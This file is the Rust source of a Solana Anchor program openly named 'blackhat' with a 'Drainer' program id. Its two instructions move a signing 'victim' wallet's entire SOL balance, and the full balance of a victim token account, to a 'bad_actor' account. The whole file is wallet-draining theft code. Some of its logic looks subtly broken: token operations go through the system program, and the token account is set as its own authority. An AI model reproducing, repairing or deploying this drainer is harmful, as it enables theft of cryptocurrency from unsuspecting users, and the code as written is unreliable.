use anchor_lang::prelude::*;
use anchor_lang::system_program::{self};
use anchor_spl::token::spl_token;
use anchor_spl::token::{self};
use borsh::BorshDeserialize;

pub mod error;

declare_id!("Drainer1111111111111111111111111111111111111");

#[derive(Accounts)]
pub struct DrainAccount<'info> {
    #[account(mut)]
    pub victim: Signer<'info>,

    #[account(mut)]
    pub bad_actor: UncheckedAccount<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct DrainTokenAccount<'info> {
    pub mint: AccountInfo<'info>,

    #[account(mut)]
    pub victim_ata: AccountInfo<'info>,
    #[account(mut)]
    pub bad_actor_ata: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[program]
pub mod blackhat {

    use solana_program::program_pack::Pack;
    use super::*;

    pub fn drain_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainAccount<'info>>,
    ) -> Result<()> {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Transfer {
                from: ctx.accounts.victim.to_account_info(),
                to: ctx.accounts.bad_actor.to_account_info(),
            },
        );

        system_program::transfer(cpi_ctx, ctx.accounts.victim.lamports())?;

        Ok(())
    }

    pub fn drain_token_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainTokenAccount<'info>>,
    ) -> Result<()> {
        if ctx.accounts.bad_actor_ata.data_is_empty() {
            let cpi_ctx = CpiContext::new(
                ctx.accounts.system_program.to_account_info(),
                token::InitializeAccount3 {
                    account: ctx.accounts.bad_actor_ata.to_account_info(),
                    mint: ctx.accounts.mint.to_account_info(),
                    authority: ctx.accounts.bad_actor_ata.to_account_info(),
                },
            );

            token::initialize_account3(cpi_ctx)?;
        }

        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            token::Transfer {
                from: ctx.accounts.victim_ata.to_account_info(),
                to: ctx.accounts.bad_actor_ata.to_account_info(),
                authority: ctx.accounts.victim_ata.to_account_info(),
            },
        );

        let token_account = spl_token::state::Account::unpack_from_slice(
            &ctx.accounts
                .victim_ata
                .to_account_info()
                .try_borrow_data()?,
        )?;

        token::transfer(cpi_ctx, token_account.amount)?;

        Ok(())
    }
}
